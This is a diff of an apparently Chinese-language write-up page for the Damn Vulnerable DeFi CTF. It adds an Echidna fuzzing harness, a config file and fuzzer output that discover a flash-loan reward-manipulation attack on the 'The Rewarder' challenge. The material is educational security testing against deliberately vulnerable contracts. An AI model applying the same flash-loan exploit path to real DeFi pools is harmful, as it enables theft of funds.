@@ -2937,6 +2937,13 @@
 </li>
         
           <li class="md-nav__item">
+  <a href="#using-echidna_3" class="md-nav__link">
+    Using Echidna
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
   <a href="#_4" class="md-nav__link">
     参考资料
   </a>
@@ -3488,6 +3495,13 @@
           <li class="md-nav__item">
   <a href="#exploit_2" class="md-nav__link">
     Exploit
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-echidna_3" class="md-nav__link">
+    Using Echidna
   </a>
   
 </li>
@@ -4129,6 +4143,7 @@ Seed:<span class="w"> </span><span class="m">8140429313308935610</span>
 <span class="w">    </span><span class="p">}</span>
 
 <span class="w">    </span><span class="c1">// IFlashLoanEtherReceiver.execute()</span>
+<span class="w">    </span><span class="c1">// some manual work to guide Echidna</span>
 <span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">execute</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
 <span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">canWithdraw</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
 <span class="w">            </span><span class="nx">pool</span><span class="p">.</span><span class="nx">withdraw</span><span class="p">();</span>
@@ -4156,7 +4171,7 @@ balanceContract: 1000000000000000000000 # 1000 ether
 
 deployer: &quot;0x10000&quot;
 psender: &quot;0x10000&quot;
-contractAddr: &quot;0x10000&quot; # only SideEntranceTest is the sender
+contractAddr: &quot;0x10000&quot; # only the SideEntranceTest contract is the sender
 sender: [&quot;0x10000&quot;]
 </code></pre></div>
 </div>
@@ -4292,9 +4307,169 @@ Seed:<span class="w"> </span><span class="m">4893652944378861842</span>
 <span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">theRewarderHacker</span><span class="p">.</span><span class="nx">exploit</span><span class="p">(</span><span class="nx">flashLoanPool</span><span class="p">.</span><span class="nx">address</span><span class="p">,</span><span class="w"> </span><span class="nx">rewardToken</span><span class="p">.</span><span class="nx">address</span><span class="p">);</span>
 <span class="p">});</span>
 </code></pre></div>
+<h3 id="using-echidna_3">Using Echidna<a class="headerlink" href="#using-echidna_3" title="Permanent link">&para;</a></h3>
+<ul>
+<li>
+<p>因为合约 <code>TheRewarderPool</code> 涉及到 <code>REWARDS_ROUND_MIN_DURATION</code>，所以在测试合约中使用了 <code>increaseTime()</code>，其它函数逻辑类似 <a href="#using-echidna-2">4. Side Entrance</a>，能够 Fuzzing 出结果，不过 Hevm 不是必需的 uwu</p>
+<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">increaseTime</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">hevm</span><span class="p">.</span><span class="nx">warp</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">5</span><span class="w"> </span><span class="nx">days</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+</li>
+</ul>
+<div class="admonition note">
+<p class="admonition-title">contracts/the-rewarder/TheRewarderTest.sol</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
+<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>
+
+<span class="k">import</span><span class="w"> </span><span class="s2">&quot;./FlashLoanerPool.sol&quot;</span><span class="p">;</span>
+<span class="k">import</span><span class="w"> </span><span class="s2">&quot;./TheRewarderPool.sol&quot;</span><span class="p">;</span>
+
+<span class="kr">interface</span><span class="w"> </span><span class="nx">IHevm</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">warp</span><span class="p">(</span><span class="nx">uint256</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="p">;</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">prank</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">sender</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nx">contract</span><span class="w"> </span><span class="nx">Deployer</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">constant</span><span class="w"> </span><span class="nx">TOKENS_IN_LENDER_POOl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1000000</span><span class="w"> </span><span class="nx">ether</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">constant</span><span class="w"> </span><span class="nx">DEPOSIT_AMOUNT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">100</span><span class="w"> </span><span class="nx">ether</span><span class="p">;</span>
+
+<span class="w">    </span><span class="nx">FlashLoanerPool</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">pool</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">TheRewarderPool</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">rewarder</span><span class="p">;</span>
+
+<span class="w">    </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">DamnValuableToken</span><span class="w"> </span><span class="nx">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">DamnValuableToken</span><span class="p">();</span>
+<span class="w">        </span><span class="nx">pool</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">FlashLoanerPool</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">token</span><span class="p">));</span>
+<span class="w">        </span><span class="nx">rewarder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">TheRewarderPool</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">token</span><span class="p">));</span>
+
+<span class="w">        </span><span class="nx">token</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">pool</span><span class="p">),</span><span class="w"> </span><span class="nx">TOKENS_IN_LENDER_POOl</span><span class="p">);</span>
+<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="nx">uint160</span><span class="w"> </span><span class="nx">u</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x20000</span><span class="p">;</span><span class="w"> </span><span class="nx">u</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mh">0x60000</span><span class="p">;</span><span class="w"> </span><span class="nx">u</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mh">0x10000</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">token</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">u</span><span class="p">),</span><span class="w"> </span><span class="nx">DEPOSIT_AMOUNT</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1">/// @dev run with `echidna . --contract TheRewarderTest --config the-rewarder.yml`</span>
+<span class="nx">contract</span><span class="w"> </span><span class="nx">TheRewarderTest</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">FlashLoanerPool</span><span class="w"> </span><span class="nx">pool</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">TheRewarderPool</span><span class="w"> </span><span class="nx">rewarder</span><span class="p">;</span>
+
+<span class="w">    </span><span class="nx">DamnValuableToken</span><span class="w"> </span><span class="nx">token</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">RewardToken</span><span class="w"> </span><span class="nx">rewardToken</span><span class="p">;</span>
+
+<span class="w">    </span><span class="nx">IHevm</span><span class="w"> </span><span class="nx">hevm</span><span class="p">;</span>
+
+<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">constant</span><span class="w"> </span><span class="nx">REWARDS_ROUND_MIN_DURATION</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">5</span><span class="w"> </span><span class="nx">days</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">constant</span><span class="w"> </span><span class="nx">TOKENS_IN_LENDER_POOl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1000000</span><span class="w"> </span><span class="nx">ether</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">constant</span><span class="w"> </span><span class="nx">DEPOSIT_AMOUNT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">100</span><span class="w"> </span><span class="nx">ether</span><span class="p">;</span>
+
+<span class="w">    </span><span class="nx">bool</span><span class="w"> </span><span class="nx">canDeposit</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">bool</span><span class="w"> </span><span class="nx">canWithdraw</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">bool</span><span class="w"> </span><span class="nx">canDistribute</span><span class="p">;</span>
+
+<span class="w">    </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">Deployer</span><span class="w"> </span><span class="nx">deployer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">Deployer</span><span class="p">();</span>
+<span class="w">        </span><span class="nx">pool</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">FlashLoanerPool</span><span class="p">(</span><span class="nx">deployer</span><span class="p">.</span><span class="nx">pool</span><span class="p">());</span>
+<span class="w">        </span><span class="nx">rewarder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">TheRewarderPool</span><span class="p">(</span><span class="nx">deployer</span><span class="p">.</span><span class="nx">rewarder</span><span class="p">());</span>
+
+<span class="w">        </span><span class="nx">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">DamnValuableToken</span><span class="p">(</span><span class="nx">rewarder</span><span class="p">.</span><span class="nx">liquidityToken</span><span class="p">());</span>
+<span class="w">        </span><span class="nx">rewardToken</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">rewarder</span><span class="p">.</span><span class="nx">rewardToken</span><span class="p">();</span>
+
+<span class="w">        </span><span class="nx">hevm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">IHevm</span><span class="p">(</span><span class="mh">0x7109709ECfa91a80626fF3989D68f67F5b1DD12D</span><span class="p">);</span><span class="w">   </span><span class="c1">// addr from docs</span>
+
+<span class="w">        </span><span class="c1">// users deposit</span>
+<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="nx">uint160</span><span class="w"> </span><span class="nx">u</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x20000</span><span class="p">;</span><span class="w"> </span><span class="nx">u</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mh">0x60000</span><span class="p">;</span><span class="w"> </span><span class="nx">u</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mh">0x10000</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">hevm</span><span class="p">.</span><span class="nx">prank</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">u</span><span class="p">));</span>
+<span class="w">            </span><span class="nx">token</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">rewarder</span><span class="p">),</span><span class="w"> </span><span class="nx">DEPOSIT_AMOUNT</span><span class="p">);</span>
+<span class="w">            </span><span class="nx">hevm</span><span class="p">.</span><span class="nx">prank</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">u</span><span class="p">));</span>
+<span class="w">            </span><span class="nx">rewarder</span><span class="p">.</span><span class="nx">deposit</span><span class="p">(</span><span class="nx">DEPOSIT_AMOUNT</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+
+<span class="w">        </span><span class="nx">hevm</span><span class="p">.</span><span class="nx">warp</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">REWARDS_ROUND_MIN_DURATION</span><span class="p">);</span>
+<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="nx">uint160</span><span class="w"> </span><span class="nx">u</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x20000</span><span class="p">;</span><span class="w"> </span><span class="nx">u</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mh">0x60000</span><span class="p">;</span><span class="w"> </span><span class="nx">u</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mh">0x10000</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">hevm</span><span class="p">.</span><span class="nx">prank</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">u</span><span class="p">));</span>
+<span class="w">            </span><span class="nx">rewarder</span><span class="p">.</span><span class="nx">distributeRewards</span><span class="p">();</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">setDeposit</span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">_enabled</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">canDeposit</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_enabled</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">setWithdraw</span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">_enabled</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">canWithdraw</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_enabled</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">setDistribute</span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">_enabled</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">canDistribute</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_enabled</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">receiveFlashLoan</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">pool</span><span class="p">));</span>
+
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">canDeposit</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">token</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">rewarder</span><span class="p">),</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
+<span class="w">            </span><span class="nx">rewarder</span><span class="p">.</span><span class="nx">deposit</span><span class="p">(</span><span class="nx">amount</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">canWithdraw</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">rewarder</span><span class="p">.</span><span class="nx">withdraw</span><span class="p">(</span><span class="nx">amount</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">canDistribute</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">rewarder</span><span class="p">.</span><span class="nx">distributeRewards</span><span class="p">();</span>
+<span class="w">        </span><span class="p">}</span>
+
+<span class="w">        </span><span class="nx">token</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">pool</span><span class="p">),</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">flashLoan</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">lastRewardsTimestamp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">rewarder</span><span class="p">.</span><span class="nx">lastRecordedSnapshotTimestamp</span><span class="p">();</span>
+<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">lastRewardsTimestamp</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">REWARDS_ROUND_MIN_DURATION</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;It&#39;s useless to call flashLoan if no rewards can be taken as ETH is precious.&quot;</span><span class="p">);</span><span class="w">  </span><span class="c1">// Thus, no need to use hevm to warp time</span>
+<span class="w">        </span><span class="nx">pool</span><span class="p">.</span><span class="nx">flashLoan</span><span class="p">(</span><span class="nx">TOKENS_IN_LENDER_POOl</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">testBalance</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">assert</span><span class="p">(</span><span class="nx">rewardToken</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">))</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">rewarder</span><span class="p">.</span><span class="nx">REWARDS</span><span class="p">()</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">99</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">100</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="p">}</span>
+</code></pre></div>
+</div>
+<div class="admonition note">
+<p class="admonition-title">the-rewarder.yml</p>
+<div class="highlight"><pre><span></span><code><span class="nx">testMode</span><span class="o">:</span><span class="w"> </span><span class="nx">assertion</span>
+
+<span class="nx">deployer</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;0x10000&quot;</span>
+<span class="nx">psender</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;0x10000&quot;</span>
+<span class="nx">contractAddr</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;0x10000&quot;</span>
+<span class="nx">sender</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;0x10000&quot;</span><span class="p">]</span>
+</code></pre></div>
+</div>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>echidna<span class="w"> </span>.<span class="w"> </span>--contract<span class="w"> </span>TheRewarderTest<span class="w"> </span>--config<span class="w"> </span>the-rewarder.yml<span class="w"> </span>
+...
+receiveFlashLoan<span class="o">(</span>uint256<span class="o">)</span>:<span class="w">  </span>passed!<span class="w"> </span>🎉
+setDistribute<span class="o">(</span>bool<span class="o">)</span>:<span class="w">  </span>passed!<span class="w"> </span>🎉
+setDeposit<span class="o">(</span>bool<span class="o">)</span>:<span class="w">  </span>passed!<span class="w"> </span>🎉
+flashLoan<span class="o">()</span>:<span class="w">  </span>passed!<span class="w"> </span>🎉
+setWithdraw<span class="o">(</span>bool<span class="o">)</span>:<span class="w">  </span>passed!<span class="w"> </span>🎉
+testBalance<span class="o">()</span>:<span class="w"> </span>failed!💥<span class="w">  </span>
+<span class="w">  </span>Call<span class="w"> </span>sequence:
+<span class="w">    </span>setDeposit<span class="o">(</span><span class="nb">true</span><span class="o">)</span><span class="w"> </span>from:<span class="w"> </span>0x0000000000000000000000000000000000010000
+<span class="w">    </span>*wait*<span class="w"> </span>Time<span class="w"> </span>delay:<span class="w"> </span><span class="m">434239</span><span class="w"> </span>seconds<span class="w"> </span>Block<span class="w"> </span>delay:<span class="w"> </span><span class="m">16633</span>
+<span class="w">    </span>setWithdraw<span class="o">(</span><span class="nb">true</span><span class="o">)</span><span class="w"> </span>from:<span class="w"> </span>0x0000000000000000000000000000000000010000
+<span class="w">    </span>flashLoan<span class="o">()</span><span class="w"> </span>from:<span class="w"> </span>0x0000000000000000000000000000000000010000
+<span class="w">    </span>testBalance<span class="o">()</span><span class="w"> </span>from:<span class="w"> </span>0x0000000000000000000000000000000000010000
+
+Event<span class="w"> </span>sequence:<span class="w"> </span>Panic<span class="o">(</span><span class="m">1</span><span class="o">)</span>:<span class="w"> </span>Using<span class="w"> </span>assert.
+AssertionFailed<span class="o">(</span>..<span class="o">)</span>:<span class="w">  </span>passed!<span class="w"> </span>🎉
+Unique<span class="w"> </span>instructions:<span class="w"> </span><span class="m">7102</span>
+Unique<span class="w"> </span>codehashes:<span class="w"> </span><span class="m">6</span>
+Corpus<span class="w"> </span>size:<span class="w"> </span><span class="m">3</span>
+Seed:<span class="w"> </span><span class="m">5526863836465074544</span>
+</code></pre></div>
 <h3 id="_4">参考资料<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
 <ul>
 <li><a href="https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#ERC20Snapshot">ERC20Snapshot</a></li>
+<li><a href="https://hevm.dev/controlling-the-unit-testing-environment.html#cheat-codes">controlling the unit testing environment - hevm</a></li>
 </ul>
 <h2 id="6-selfie">6. Selfie<a class="headerlink" href="#6-selfie" title="Permanent link">&para;</a></h2>
 <blockquote>
@@ -4575,7 +4750,7 @@ server: cloudflare
   <small>
     
       最后更新:
-      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2023年5月9日 23:01:10</span>
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2023年6月24日 14:57:30</span>
       
     
   </small>
